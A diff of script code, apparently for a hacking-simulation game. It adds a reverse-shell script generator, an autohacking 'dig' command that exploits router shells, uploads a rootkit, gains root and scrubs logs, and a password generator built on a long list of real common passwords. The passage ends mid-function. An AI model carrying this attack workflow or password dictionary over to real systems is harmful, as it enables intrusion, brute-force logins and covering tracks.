+    nop="meta = include_lib("+m_path+");if not meta then include_lib("+m+");if not meta then exit(ps);meta.rshell_client("+add+",1222,"+ps+");exit(ps)"
+    header = char(10)+"// Cloak and Dagger"+char(10)
+    cd = (header+char(10)+rip+char(10)+nop)
+    localmachine.touch(currentPath, "ps.src")
+    source = globals.get_file("ps.src")
+    print("Cloak and Dagger Protocol v 0.4, by Plu70")
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
+    if source then
+      source.set_content(cd)
+      wait(1)
+      out = source.get_content
+      print(out)
+      print
+        print(colorLightBlue+"Saved to: "+colorWhite+currentPath+"/ps.src"+CT)
+    else
+      print("write failed"+char(10))
+    end if
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
+    return 0
+end function
+  // command.dig = function(arg1, arg2, arg3=0, arg4=0)
+  // 	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Usage: dig [ip] [opt:port] -- upload a netcrawler to deep scan a network. "+char(10)+"port may be 0 or blank (dig [ip]) for standard use (targets router)."+char(10)+"crawler attempts to scrub logs but this may need to be done manually"+char(10)+"Advanced: clipb @B 1 | dig  (where BUFFER[1] contained a shell) -- dig that shell"+char(10)+"other methods may be used to pipe shells. eg zap | dig (this is redundant as dig runs zap internally)"+char(10)+"<b>N.B. dig is not (yet) integrated with db (the databaser) please scan libs before running dig.</b>"+char(10)+"N.B. future versions will also include an all command line version (to bypass the interactive setup)"+char(10)+"<b>Important</b>: Press enter at most prompts to use defaults (recommended)."+char(10)+"When prompted for an exploit to use, select a shell exploit."+char(10)+"If you know the password you may enter it on the SECOND password prompt. It will be colored cyan."+char(10)+"If you don't know the password, DIG is useful for finding it."+char(10)+"You may customize dig, to some degree, when prompted."
+  // 	// dig local vars
+  // 	del_rkit = "y"
+  // 	have_pass = ""
+  //   id_target = function()
+  //     tar_shel = null
+  //     target_ip = arg1
+  //     port = "router"
+  //     if arg2 then port = arg2
+  //     if port == "0" or not port then port = "router"
+  // 		// insert dbaser code here
+  //     if typeof(target_ip) == "shell" then return target_ip
+  //     if not is_valid_ip(target_ip) then return "dig: invalid ip"
+  //     print(colorGold+"Initiating pre-dig outer scan..."+CT)
+  //     command.probe(target_ip,port)
+  //     command.meta("link", "-r")
+  //     tar_shel = command.zap
+  //     if tar_shel and typeof(tar_shel) == "shell" and (tar_shel.host_computer.public_ip == target_ip or tar_shel.host_computer.local_ip == target_ip) then
+  //       print(colorLightBlue+"dig: target accquired: "+CT+colorOrange+"["+checkUser(tar_shel)+":"+typeof(tar_shel)+"] "+CT+"<b>"+tar_shel.host_computer.public_ip+"</b>")
+  //     else
+  //       return "dig: unable to find a shell on the target"
+  //     end if
+  //     return tar_shel
+  //   end function
+  
+  //   prepare_package = function()
+  //     pay_path = user_input("full path to rkit (default: /root/rkit) "+char(10)+":> ",0,0)
+  //     if pay_path == "" or pay_path == " " then pay_path = "/root/rkit"
+  //     if pay_path == "" or pay_path == " " then return "aborting..."
+  //     payload = localmachine.File(pay_path)
+  //     if not payload then return "404: "+pay_path+" not found"
+  //     localmachine.touch(payload.path, "dig.bat")
+  //     dig_bat = localmachine.File(payload.path+"/dig.bat")
+  //     if not dig_bat then return "write error: could not create dig.bat"
+  //     dig_bat.set_content("ifconfig -l | probe -f"+char(10))
+  //     print(char(10)+"Found: "+payload.path + " " + payload.size + " " + payload.permissions+char(10))
+  //     print("<b>edit permissions</b>? (default: yes)")
+  //     mod = user_input("[<b>0</b>] yes [1] no (q=quit)||: ",0,1)
+  //     if mod != "1" then
+  //       print("e.g. o+rwx g-rwx u+x (string all edits on one line separated by spaces)")
+  // 			ed_in = user_input("params for [perms/chmod -r] (default:<b> o+rwx </b>, q=quit)"+char(10)+":> ")
+  // 			if ed_in.lower == "q" then return "aborting..."
+  // 			if ed_in == "" then ed_in = ["o+rwx"] else ed_in = ed_in.split(" ")
+  //       for ed in ed_in
+  //         command.perms("-r", ed, payload.path)
+  //       end for
+  //     end if
+  // 		if mod.lower == "q" then return "aborting..."
+  // 		print
+  // 		print("Would you like to edit dig.bat before uploading? (default: no)")
+  // 		edit_bat = user_input("[<b>0</b>] no [1] yes (q=quit)"+char(10)+"||: ",0,1)
+  // 		if edit_bat == "1" then
+  // 			bat_path = payload.path + "/dig.bat"
+  // 			print(colorGold+"Editing "+bat_path+char(10)+"Please use caution. Abort with @@ on a new line.")
+  // 			command.scribus(bat_path)
+  // 			dig_bat.set_content(dig_bat.get_content+char(10))
+  // 		end if
+  // 		print(char(10)+"<b>Payload Ready: "+payload.path + " " + payload.size + " " + payload.permissions+"</b>"+char(10))
+  //     return payload // (package)
+  //   end function
+  
+  //   upload_package = function(package) // (payload)
+  //     tar = id_target
+  //     if typeof(tar) == "string" then return tar
+  //     command.clipb(tar)
+  //     print("Expanding filesystem: search for a vulnerable entry point...")
+  //     command.tree("@clipb","/",0,"N")
+  //     dest_folder = user_input("destination folder (default: /home/guest) "+char(10)+":> ")
+  // 		del_rkit = user_input("Delete the rkit once uploaded? [Y/n]"+char(10)+"||: ",0,1)
+  // 		if dest_folder == "" or dest_folder == " " then dest_folder = "/home/guest"
+  // 		dig_bat = localmachine.File(package.path+"/dig.bat")
+  // 		if del_rkit.lower != "n" then
+  // 			dig_bat.set_content(dig_bat.get_content+"echo <b>deleting rkit</b>"+char(10)+"rm -r "+dest_folder+"/rkit"+char(10))
+  // 		end if
+  // 		have_pass = user_input(colorCyan+"enter a password for dig to use (leave blank for cerebrum or type:<b> -f brutus </b> :to force brutus without cerebrum.)"+CT+char(10)+":> ")
+  // 		if have_pass == "-f brutus" then
+  // 			dig_bat.set_content(dig_bat.get_content+"echo <b>Getting root/covering tracks...</b>"+char(10)+"brutus | rclean"+char(10))
+  // 		else
+  // 			if have_pass != "" and have_pass != " " then
+  // 				dig_bat.set_content(dig_bat.get_content+"echo <b>Getting root/covering tracks...</b>"+char(10)+"psudo -s "+have_pass+" | rclean"+char(10))
+  // 			else
+  // 				dig_bat.set_content(dig_bat.get_content+"echo <b>Getting root...</b> | cerebrum"+char(10))
+  // 				dig_bat.set_content(dig_bat.get_content+"echo <b>Covering tracks...</b>"+char(10)+"brutus | rclean"+char(10))
+  // 			end if
+  // 		end if
+  // 		print(colorGold+"<u>=======uploading rkit package=======</u>")
+  // 	  if typeof(tar) == "shell" then
+  // 	  	print(shell.scp(package.path, dest_folder, tar))
+  // 			print("Locking down localhost")
+  // 			command.perms("lock","all")
+  // 	    hold = globals.shell
+  // 	    globals.shell = tar
+  // 	    globals.localmachine = shell.host_computer
+  // 	    dig_bat = localmachine.File(dest_folder+"/rkit/dig.bat")
+  // 	    if not dig_bat then
+  // 	    	print("I/O error...")
+  // 	      globals.shell = hold
+  // 	      globals.localmachine = shell.host_computer
+  // 	      return "dig: upload failed"
+  // 	    end if
+  //       print(colorGold+"Digging network..."+CT+char(10))
+  //       command.run(dest_folder+"/rkit/5hell", "do 1 -f dig.bat")
+  //       globals.shell = hold
+  //       globals.localmachine = shell.host_computer
+  //       return "dig: complete. remember to lock down permissions! (ie type: lock)"
+  //     else
+  //       return "dig: failed. remember to lock down permissions! (ie type: lock)"
+  //     end if
+  //     return 0
+  //   end function
+  
+  //   deploy_package = function()
+  //     print(colorGold+"<u>------DIG-v-0.5.3------</u>"+CT+char(10)+"Follow defaults at prompts for <u>standard</u> use. (ie press [enter] at prompts)")
+  //     return upload_package(prepare_package)
+  //   end function
+  //   // ifconfig -p | probe -f
+  //   // cerebrum
+  //   // rm -r /home/guest/rkit
+  //   // brutus | rclean
+  //   catch = deploy_package
+  //   return catch
+  // end function
+command.dig = function(arg1,arg2=0,arg3=0,arg4=0)
+  if not arg1 or arg1 == "help" or arg1 == "-h" then 
+    if arg2 and arg2 == "extra" then return colorGold+"Dig: Extra!"+CT+char(10)+"Here is a useful dig.bat script for dropping rshells"+char(10)+"first, set dig.bat to:"+char(10)+
+		"ifconfig -p | probe -q"+char(10)+
+		"brutus | clipb"+char(10)+
+		"clipa | echo PASSWORD:"+char(10)+
+		"echo do 1 -f r.bat | clipc"+char(10)+
+		"run /home/guest/rkit/5hell @b @c"+char(10)+
+		"rclean -d 1"+char(10)+
+		"quit dig_complete"+char(10)+char(10)+
+		"then, poke a new file in rkit called r.bat"+char(10)+
+		"set it to:"+char(10)+
+		"rshell [your server ip] [some name]"+char(10)+
+		"-- if you have set HOME_SERVER then use this line instead:"+char(10)+
+		"rshell @home [some name]"+char(10)+
+		"quit rshell_placed"+char(10)+char(10)+
+		"This will dig the target like normal, then launch 5hell with the gained root shell"+char(10)+"Once launched, a reverse shell will be dropped, the log scrubbed, rkit removed, and dig will exit both 5hell instances."
+    return "<b>DIG v 2.1 Netcrawler || Autohacking || Automation</b>"+char(10)+
+	"Usage: dig [-s|ip|port] [port|ip] [opt:--edit] -- auto-infiltrate a target"+char(10)+
+	"-- runs <b>db</b> on target [ip] and [port]"+char(10)+
+	"-- infiltrates via shell if found"+char(10)+
+	"-- uploads rkit and runs 5hell on the target"+char(10)+
+	"-- gains root and wipes the log"+char(10)+
+	"-- performs other taskes as defined by the user in <u>dig.bat"+char(10)+
+	"-- dig.bat may contain <b>do</b>calls (do # -f your.file) to daisy chain digs"+char(10)+
+	"Note: dig may take port and ip in any order"+char(10)+
+	"-- not supplying a port defaults to port 0 aka the rouer"+char(10)+
+	"Usage: dig -s -- will scan the internet for a suitable target"+char(10)+
+	"-- uses database.csv to choose targets with known kernel_router versions"+char(10)+
+	"-- if the matched router has a shell exploit, dig will auto infiltrate as normal"+char(10)+
+	"-- susses out random ips until a match is found"+char(10)+
+	"-- sussing routers does not leave a log if no shell is found"+char(10)+
+	"Note: edit /root/rkit/dig.bat to customize behavior"+char(10)+
+	"-- by default you will be prompted to exit 5hell when dig completes"+char(10)+
+	"-- type 'y' to exit and return to the script that launched dig"+char(10)+
+	"-- or add <b>quit dig_complete</b> to exit automatically with an echo"+char(10)+
+	"<b>Note:</b> supplying <b>--edit</b> as argument three will open dig.bat in scribus"+char(10)+
+	"-- dig will continue as normal after editing is complete"+char(10)+
+	"-- you may add/remove commands to be executed by dig here"+char(10)+
+	"<b>Note:</b> supplying <b>--edit</b> as agrgument one will open dig.bat in scribus"+char(10)+
+	"-- dig will then exit after editing the batch file."+char(10)+
+	"Usage example:|> <b>rnip 1 | dig </b>"+char(10)+
+    "Usage example:|> <b>dig 1.1.1.1 22 --edit"+char(10)+
+	"Usage example:|> <b>do 20 | dig -s"
+	colorGold+"Experimental</b></color>: dig -s -- sus mode, gets random routers and checks version against database"+char(10)+
+	"-- if the lib version is in the database, will dig that router"+char(10)+
+	"-- sussing specifically looks for shells on routers"+char(10)+
+	"-- for best results, use a database.csv that only includes entries with shell exploits"+char(10)+
+	"---- Extra: dig [-h|help] extra -- display extra help info"
+  end if
+  print(colorGold+"<u>------DIG-v-2.1------</u>"+CT+char(10))
+  //tp = arg1.split(" ") // sometimes we want to pipe target ip AND a port. this will help with that.
+  tp = arg1
+  //t = tp[0] // target ip
+  //p = tp[-1] // target port
+  t = arg1 
+  p = arg2
+  if t == "-s" then 
+  	t = globals.sus // in 5phinx.5pk
+	p = "0"
+  end if
+  //if p == t then p = arg2 /////////////// make sure this works: if arg1 was not split, arg 2 is the port. default is 0 aka router
+  if not is_valid_ip(t) and t != "--edit" then
+    t = arg2 
+    p = arg1 
+    if not is_valid_ip(t) and t != "--edit" then return "dig: invalid ip"
+  end if
+  if DEBUG then print "debug: target ip: "+t+char(10)+"debug: target port: "+p
+  // find the root kit     
+  kit = command.tree("/","rkit",1,"N")
+  if not kit then return "rkit not found"
+  pe = kit.permissions.values
+  r = 0
+  w = 0
+  x = 0
+  if pe[-1] == "x" then x = 1
+  if pe[-2] == "w" then w = 1
+  if pe[-3] == "r" then r = 1
+  // edit dig.bat if necessary
+  bat_file = globals.get_file(kit.path+"/dig.bat")
+  if not bat_file then 
+      command.poke(kit.path+"/dig.bat", "ifconfig -p | probe -f"+char(10)+"brutus | rclean")
+      bat_file = globals.get_file(kit.path+"/dig.bat")
+      if not bat_file then return "dig: unable to find or create dig.bat, aborting."
+  end if
+  if arg1 == "--edit" or arg2 == "--edit" or arg3 == "--edit" or arg4 == "--edit" then 
+	print("Editing the batch file: "+bat_file.path)
+	command.scribus(bat_file)
+  	if arg1 == "--edit" then return "dig: finished editing dig.bat"
+	if p == "--edit" then p = "0"
+  end if
+  // verify that we're ready to go
+  print("Checking dictionary...")
+  if not BIGBRAIN then 
+      tabs = localmachine.File("/root/tables/tp")
+      if tabs then 
+          command.cerebrum("-i",tabs.path)
+      else 
+          command.cerebrum
+      end if
+  end if
+  // portmap target
+  command.probe("-q",t,p)
+  // if not in database, scan target
+  if command.meta("link","-r") then
+      command.db("-r")
+      if command.meta("link","-r") then // idfk
+          return "dig: database error!"
+      end if
+  end if
+  // if shell exploit, exploit target
+  mem = ""
+  val = ""
+  for xp in globals.XPLOITS
+      yp = xp.split(" ")
+      zp = yp[-1]
+      if zp == "shell" then 
+          mem = yp[0]
+          val = yp[1]
+      end if
+  end for
+  if mem == "" then return "dig: shell exploit not found on target"
+  dig_this = null
+  dig_this = command.zap(mem,val,0) // get the remote shell
+  if typeof(dig_this) != "shell" then return "dig: failed to obtain shell on target."
+  // upload rkit (mind permissions)
+  if DEBUG then print "dig: found a shell"
+  print command.perms("-r","o+rwx", kit.path)
+  print kit.path+ " "+kit.permissions
+  globals.shell.scp(kit.path, "/home/guest", dig_this)
+  // command.perms("-r","o-rwx","/root/rkit")
+  pe = ""
+  if not r then pe = pe + "r"
+  if not w then pe = pe + "w"
+  if not x then pe = pe + "x"
+  if pe != "" then print command.perms("-r","o-"+pe, kit.path)
+  print "restoring permissions: "+kit.path+" "+kit.permissions
+  // run 5hell on target with params:
+  // -- cob import | brutus
+  // -- other user defined params
+  print "launching 5hell remotely..."
+  globals.stack_pool("up")
+  dig_this.launch("/home/guest/rkit/5hell", "do 1 -f /home/guest/rkit/dig.bat")
+  globals.stack_pool("down")
+  // rclean and exit
+  // repeat if necessary
+  return "returning to original 5hell session..."
+end function
+
+// original pwgen by usespython, additions by Plu70
+if DEBUG then print("<size=75%>loading ...pwgen.5pk...(31.479kb)</size>")
+command.pwgen = function(arg1, arg2=0, arg3=0, arg4=0)
+	if arg1 == "help" or arg1 == "-h" then return "pwgen: generate a friggin lot of passwords with hashes."+char(10)+"Usage: pwgen -- generate tables/tp/ and files with one password per line"+char(10)+"Usage: pwgen hash -- generate tables/t5 and files with hash=pw one per line"+char(10)+"Use cerebrum to expand onboard dictionary."
+
+	// pwgen v0.4 author unkown, modifications by Plu70
+	PASSWORDSB="belagio,balencia,ibiza,3k4l23ll,4567adee,bees,Bee123,hobo,heebeejeebee,geronimo69,Es1,day,abcd,abc1,baby,mayday,today,yesterday,fifteen,abgDw32fhGu58k,69696969,sfuzzer,111,1111,222,2222,3333,333,00000,000,4444,444,5555,555,55555555,4fb426abgDw32fHG,666,6666,thx1138,7777,777,8888,888,9999,999,0000,oicu812,1337,8008,4hpu79htgbr,80085,007007,43110,69696969,t23t49k21af3,evkfdhgbv78ery,6h057,h4ck,h4ckg4m3,g01ng,p0st4l,g01ngp0st4l,81rd,7074g,35sk1m0,pr0n,n00b,nu8,suxor,hazorz,5uxzorz,owned,pwnd,0wnd,p0wn3d,w00t,woo7,woot,w007,10100111001,teh,meh,lol,brb,afk,wyd,gtfo,lmao,lmfao,gitgud,lawl,troll,bawl,epic,54321,987654321,88888888,555555,1234567890,1973,147147,151515,1515,101010,202020,21122112,12341234,74lk,dir7y,53nP4I,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,1,2,3,4,5,6,7,8,9,0,le375p34k,420420,11111111,112233,h4f4jf53fk74,123abc,1234qwer,123321,5y4hpu79htgbrub,ncc1701e,7777777,51505150,000000,5150,222222,999999,252525,77777777,98765432,poop,polyamorous,zelda,password,6gtr43,123456,12345678,1234,qwerty,12345,dragon,baseball,football,letmein,monkey,696969,abc123,mustang,michael,shadow,master,jennifer,111111,2000,jordan,superman,harley,1234567,hunter,trustno1,ranger,buster,thomas,tigger,robert,soccer,batman,test,pass,hockey,george,charlie,andrew,michelle,love,sunshine,jessica,6969,pepper,daniel,access,123456789,654321,joshua,maggie,starwars,silver,william,dallas,yankees,123123,ashley,666666,hello,amanda,orange,biteme,freedom,computer,sexy,thunder,nicole,ginger,heather,hammer,summer,corvette,taylor,swift,austin,1111,merlin,matthew,121212,golfer,cheese,princess,martin,chelsea,patrick,richard,diamond,yellow,bigdog,secret,asdfgh,sparky,cowboy,camaro,anthony,matrix,falcon,iloveyou,bailey,guitar,jackson,purple,scooter,phoenix,aaaaaa,morgan,tigers,porsche,mickey,maverick,cookie,nascar,peanut,justin,131313,money,horny,samantha,panties,steelers,joseph,snoopy,boomer,whatever,iceman,smokey,gateway,dakota,cowboys,eagles,chicken,black,zxcvbn,please,pharoa,andrea,ferrari,knight,hardcore,porn,ass,love,sex,hooker,blow,coke,melissa,compaq,coffee,booboo,bitch,johnny,bulldog,xxxxxx,welcome,james,player,ncc1701,wizard,scooby,charles,junior,internet,mike,brandy,tennis,banana,monster,spider,lakers,miller,rabbit,enter,mercedes,brandon,steven,fender,john,yamaha,diablo,chris,boston,tiger,marine,chicago,rangers,gandalf,winter,bigtits,barney,edward,raiders,porn,badboy,blowme,spanky,bigdaddy,johnson,chester,london,midnight,blue,fishing,hannah,slayer,rachel,sexsex,redsox,asdf,marlboro,panther,zxcvbnm,arsenal,oliver,qazwsx,mother,victoria,jasper,angel,david,winner,crystal,golden,butthead,viking,jack,iwantu,shannon,murphy,angels,prince,cameron,girls,madison,wilson,carlos,hooters,willie,startrek,captain,maddog,jasmine,butter,booger,angela,golf,lauren,rocket,tiffany,theman,dennis,liverpoo,flower,forever,green,jackie,muffin,turtle,sophie,danielle,redskins,toyota,jason,sierra,winston,debbie,giants,packers,newyork,jeremy,casper,bubba,dracula,sandra,lovers,mountain,united,cooper,driver,tucker,helpme,pookie,lucky,maxwell,8675309,bear,suckit,gators,shithead,jaguar,monica,fred,happy,hotdog,tits,gemini,lover,xxxxxxxx,777777,canada,nathan,victor,florida,nicholas,rosebud,metallic,doctor,trouble,success,stupid,tomcat,warrior,peaches,apples,fish,qwertyui,magic,buddy,dolphins,rainbow,gunner,987654,freddy,alexis,braves,2112,1212,xavier,dolphin,testing,bond007,member,calvin,voodoo,7777,samson,alex,apollo,fire,tester,chess,walter,beavis,voyager,peter,porno,bonnie,rush2112,beer,apple,scorpio,jonathan,skippy,sydney,scott,red123,power,gordon,travis,beaver,star,flyers,232323,zzzzzz,steve,rebecca,scorpion,doggie,legend,ou812,yankee,blazer,bill,runner,birdie,bitches,parker,topgun,asdfasdf,heaven,viper,animal,bigboy,arthur,baby,private,godzilla,donald,williams,lifehack,phantom,dave,rock,august,sammy,cool,brian,platinum,jake,bronco,paul,mark,frank,heka6w2,copper,billy,cumshot,garfield,willow,cunt,little,carter,slut,albert,kitten,super,jordan23,eagle1,shelby,america,11111,jessie,house,free,chevy,bullshit,white,broncos,horney,surfer,nissan,saturn,airborne,elephant,marvin,shit,action,adidas,qwert,kevin,1313,explorer,walker,police,christin,december,benjamin,wolf,sweet,therock,king,online,brooklyn,teresa,cricket,sharon,dexter,racing,penis,gregory,0000,teens,redwings,dreams,michigan,hentai,magnum,87654321,nothing,donkey,trinity,digital,333333,ramsesii,stella,cartman,guinness,speedy,buffalo,kitty,pimpin,eagle,einstein,kelly,nelson,nirvana,vampire,xxxx,playboy,louise,pumpkin,snowball,test123,girl,sucker,mexico,beatles,fantasy,ford,gibson,celtic,marcus,cherry,cassie,888888,natasha,sniper,chance,genesis,hotrod,reddog,alexande,college,jester,passw0rd,smith,lasvegas,carmen,slipknot,death,kimberly,1q2w3e,eclipse,1q2w3e4r,stanley,samuel,drummer,homer,montana,music,aaaa,spencer,jimmy,carolina,colorado,creative,hello1,rocky,goober,friday,AceofSpades,bollocks,scotty,abcdef,bubbles,hawaii,asakista,fluffy,mine,stephen,horses,thumper,darkness,asdfghjk,pamela,boobies,buddha,vanessa,sandman,naughty,douglas,honda,matt,azerty,6666,shorty,money1,beach,loveme,4321,simple,poohbear,444444,badass,destiny,sarah,denise,vikings,lizard,melanie,assman,sabrina,nintendo,water,good,howard,time,123qwe,november,xxxxx,october,zxcv,shamrock,atlantis,warren,wordpass,julian,mariah,rommel,1010,harris,predator,sylvia,massive,cats,sammy1,mister,stud,marathon,rubber,ding,trunks,desire,montreal,justme,faster,kathleen,irish,1999,bertha,jessica1,alpine,sammie,diamonds,tristan,swinger,shan,stallion,pitbull,letmein2,roberto,ready,april,palmer,ming,shadow1,audrey,chong,clitoris,wang,shirley,jackoff,bluesky,sundance,renegade,hollywoo,bernard,wolfman,soldier,picture,pierre,ling,goddess,manager,nikita,76hj93DB3wsa2,sweety,titans,hang,fang,ficken,niners,bottom,bubble,hello123,ibanez,webster,sweetpea,stocking,freeman,french,mongoose,speed,dddddd,hong,henry,hungry,yang,catdog,cheng,ghost,gogogo,randy,tottenha,curious,butterfl,mission,january,singer,sherman,shark,techno,lancer,lalala,autumn,chichi,orion,trixie,clifford,delta,bobbob,bomber,holden,kang,kiss,1968,spunky,liquid,mary,beagle,granny,network,bond,kkkkkk,millie,biggie,beetle,teacher,susan,toronto,anakin,genius,dream,dang,bush,nyx".split(",")
+	PASSWORDSA="323232,blonde,lond,osint,msfconsole,Bd5gHie89YA,tornado,lindsey,content,bruce,buck,aragorn,griffin,chen,campbell,trojan,christop,newman,wayne,tina,rockstar,father,geronimo,pascal,crimson,brooks,hector,penny,anna,camera,chandler,fatcat,lovelove,cody,cunts,waters,stimpy,finger,cindy,wheels,viper1,latin,robin,greenday,creampie,brendan,hiphop,willy,snapper,funtime,duck,trombone,adult,cotton,cookies,kaiser,mulder,westham,latino,jeep,ravens,aurora,drizzt,madness,hermit,energy,kinky,314159,leather,bastard,young,,extreme,hard,password1,vincent,lacrosse,hotmail,spooky,amateur,alaska,badger,paradise,maryjane,soup,crazy,mozart,video,russell,vagina,spitfire,anderson,norman,otaku,eric,cherokee,cougar,barbara,long,family,horse,enigma,allison,raider,brazil,blonde,jones,55555,dude,drowssap,jeff,school,marshall,lovely,1qaz2wsx,jeffrey,caroline,franklin,booty,molly,snickers,leslie,nipples,courtney,diesel,rocks,eminem,westside,suzuki,daddy,passion,hummer,ladies,Azachary,frankie,elvis,reggie,alpha,suckme,simpson,patricia,pirate,tommy,semperfi,jupiter,redrum,freeuser,wanker,stinky,ducati,paris,natalie,babygirl,bishop,windows,spirit,tiktok,thot,pantera,monday,patches,brutus,houston,smooth,penguin,marley,forest,cream,212121,flash,maximus,nipple,bobby,bradley,vision,pokemon,champion,fireman,indian,softball,picard,system,clinton,cobra,enjoy,lucky1,claire,claudia,boogie,timothy,marines,security,dirty,admin,wildcats,pimp,dancer,hardon,veronica,abcd1234,abcdefg,ironman,wolverin,remember,great,freepass,bigred,squirt,justice,francis,hobbes,kermit,pearljam,mercury,domino,9999,denver,brooke,rascal,hitman,mistress,simon,tony,bbbbbb,friend,peekaboo,naked,budlight,electric,sluts,stargate,saints,bondage,brittany,bigman,zombie,swimming,duke,qwerty1,babes,scotland,disney,rooster,brenda,mookie,swordfis,candy,duncan,olivia,hunting,blink182,alicia,8888,samsung,bubba1,whore,virginia,general,passport,aaaaaaaa,erotic,liberty,arizona,jesus,abcd,newport,skipper,rolltide,balls,happy1,galore,christ,weasel,242424,wombat,digger,classic,bulldogs,poopoo,accord,popcorn,turkey,jenny,amber,bunny,mouse,titanic,liverpool,dreamer,everton,friends,chevelle,carrie,gabriel,psycho,nemesis,burton,pontiac,connor,eatme,lickme,roland,cumming,mitchell,ireland,lincoln,arnold,spiderma,patriots,goblue,devils,eugene,empire,asdfg,cardinal,brown,shaggy,froggy,qwer,kawasaki,kodiak,people,phpbb,light,kramer,chopper,hooker,honey,whynot,lisa,baxter,adam,snake,ncc1701d,qqqqqq,airplane,britney,avalon,sandy,sugar,sublime,stewart,wildcat,raven,scarface,elizabet,123654,trucks,wolfpack,lawrence,raymond,american,alyssa,bambam,movie,woody,shaved,snowman,tiger1,chicks,raptor,1969,stingray,shooter,france,stars,madmax,kristen,sports,jerry,789456,garcia,simpsons,lights,ryan,looking,chronic,alison,hahaha,packard,hendrix,perfect,service,spring,srinivas,spike,katie,oscar,brother,bigmac,suck,single,cannon,georgia,popeye,tattoo,texas,party,bullet,taurus,sailor,wolves,panthers,japan,strike,flowers,pussycat,chris1,loverboy,berlin,sticky,marina,tarheels,fisher,russia,connie,wolfgang,testtest,mature,bass,catch22,juice,michael1,159753,women,alpha1,trooper,hawkeye,head,freaky,dodgers,pakistan,machine,pyramid,vegeta,katana,moose,tinker,coyote,infinity,inside,letmein1,bang,control,hercules,morris,james1,tickle,outlaw,browns,billybob,pickle,test1,michele,antonio,sucks,pavilion,changeme,caesar,prelude,tanner,adrian,darkside,bowling,wutang,sunset,robbie,alabama,danger,zeppelin,juan,rusty,pppppp,nick,2001,ping,darkstar,madonna,qwe123,bigone,casino,cheryl,charlie1,mmmmmm,lakota,akota,integra,wrangler,apache,tweety,qwerty12,bobafett,simone,none,business,sterling,trevor,transam,dustin,harvey,england,2323,seattle,ssssss,rose,harry,openup,pandora,trucker,wallace,indigo,storm,malibu,weed,review,babydoll,doggy,dilbert,pegasus,joker,catfish,flipper,valerie,herman,detroit,kenneth,cheyenne,bruins,stacey,smoke,joey,seven,marino,fetish,xfiles,wonder,stinger,pizza,babe,pretty,stealth,manutd,gracie,gundam,cessna,longhorn,presario,mnbvcxz,wicked,mustang1,victory,shelly,awesome,athena,q1w2e3r4,help,holiday,knicks,street,redneck,casey,gizmo,scully,dragon1,devildog,triumph,eddie,bluebird,shotgun,peewee,hubris,ronnie,angel1,daisy,special,metallica,madman,country,impala,lennon,roscoe,omega,access14,enterpri,miranda,search,smitty,blizzard,unicorn,tight,rick,ronald,asdf1234,harrison,trigger,truck,danny,home,winnie,beauty,thailand,cadillac,castle,tyler,bobcat,buddy1,sunny,stones,asian,freddie,chuck,butt,loveyou,norton,hellfire,hotsex,indiana,short,panzer,lonewolf,trumpet,colors,blaster,12121212,fireball,logan,precious,aaron,elaine,jungle,masamune,atlanta,gold,corona,curtis,nikki,polaris,timber,theone,baller,chipper,orlando,island,skyline,dragons,dogs,benson,licker,goldie,engineer,kong,pencil,basketba,open,hornet,world,linda,barbie,chan,farmer,valentin,indians,larry,redman,foobar,travel,morpheus,bernie,target,141414,hotstuff,photos,laura,savage,holly,rocky1,dollar,turbo,design,newton,hottie,moon,blondes,4128,lestat,avatar,future,goforit,random,abgrtyu,jjjjjj,q1w2e3,smiley,goldberg,express,zipper,wrinkle1,stone,andy,babylon,dong,powers,consumer,dudley,Aster,monkey1,serenity,samurai,99999999,skeeter,lindsay,joejoe,master1,aaaaa,chocolat,christia,birthday,stephani,tang,alfred,ball,maria,sexual,maxima,sampson,buckeye,highland,kristin,seminole,reaper,bassman,nugget,lucifer,airforce,nasty,watson,warlock,2121,philip,always,dodge,chrissy,burger,bird,snatch,missy,pink,gang,maddie,holmes,huskers,piglet,photo,joanne,hamilton,dodger,paladin,christy,chubby,buckeyes,hamlet,abcdefgh,bigfoot,sunday,manson,goldfish,garden,deftones,icecream,blondie,spartan,julie,harold,charger,brandi,stormy,sherry,pleasure,juventus,rodney,galaxy,holland,escort,zxcvb,planet,jerome,wesley,blues,song,peace,david1,1966,cavalier,gambit,karen,sidney,ripper,jamie,sister,marie,martha,nylons,aardvark,nadine,minnie,whiskey,bing,plastic,anal,babylon5,chang,savannah,loser,racecar,insane,yankees1,mememe,hansolo,chiefs,fredfred,freak,frog,salmon,concrete,yvonne,sophia,stefan,8a1n80w,slick,rocker,opensesame,onessnap".split(",")
+	PASSWORDSC="123456789098765,012345678909876,abgDw32fhGu58k,Bd5gHie89YA,HG54h49lklj4G53,Bd5gHie89YA,59038qyghq340fg,tgby2hnr4fv9ujm,abcplm123098tg6,3dsvi2psdfn34,a03nf93nf8,3edv45gb8ub202n,afdiounwrnnfsa,234086531230324,111111111111111,222222222222222,333333333333333,444444444444444,55555555555555,666666666666666,777777777777777,888888888888888,999999999999999,000000000000000,efh368jhr08712,asdfghjkl102938,ghfjdkslatywoec,bogu2847mshd02,1357924680aoejd,g35gk5k63l10,d0emgh4m43la,ae51wc3g7d9c,GHEITHEKA102938,HHHHHHHHHHHHH,AAAAAAAAAAAAAAAA,RRRRRRRRRRRRRRRR,sssssssssssssss,ttttttttttttttt,llllllllllllll,eeeeeeeeeeeee,uuuuuuuuuuuu,oooooooooo,aaaaaaaa,1234,123,987,567,654,56432,12345,55555,99999,34567,jhgfd,uiopl,mnbvc,ytrewq,iuhhfd,sadregh,01010101010101,1010101010101010,000111000111000,einagearghaaer,235gdfa5yhgea,aletgadfgraerga,0k9j8h7g6f5f4ed2,afdsawe4togfido,butyrhdncbuh,39n8nf93fk59,adfsafawefgaag,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,1,2,3,4,5,6,7,8,9,0".split(",")
+	PASSWORDS = PASSWORDSA + PASSWORDSB
+	if arg2 == "-p" then PASSWORDS = PASSWORDSC
+	String={}
+	String.capitalize=function(s)
+	if s.len<2 then return s.upper
+	return s[0].upper+s[1:].lower
+	end function
+	String.strip=function(t,s)
+	if not t then return ""
+	for b in range(0,t.len-1)
+		if s.indexOf(t[b])==null then break
+	end for
+	if s.indexOf(t[b])>=0 then return ""
+	for e in range(-1,-1*t.len)
+		if s.indexOf(t[e])==null then break
+	end for
+	if e==-1 then return t[b:]
+	return t[b:e+1]
+	end function
+	PasswordGenerator={}
+	PasswordGenerator.init=function(samples)
